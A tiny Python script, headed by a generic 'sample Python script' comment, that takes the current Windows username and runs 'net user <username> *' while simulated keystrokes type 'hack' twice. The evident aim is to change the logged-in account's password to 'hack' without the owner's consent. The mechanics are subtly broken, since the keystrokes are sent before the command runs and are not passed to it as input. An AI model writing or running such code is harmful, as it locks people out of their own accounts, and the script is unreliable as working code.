# This is a sample Python script.
import getpass
import subprocess
import pyautogui
username = getpass.getuser()
print(username)
subprocess.run("net user" +' "'+username+'"'+ " *",shell=True,input=pyautogui.typewrite(['h','a','c','k','enter','h','a','c','k','enter']))
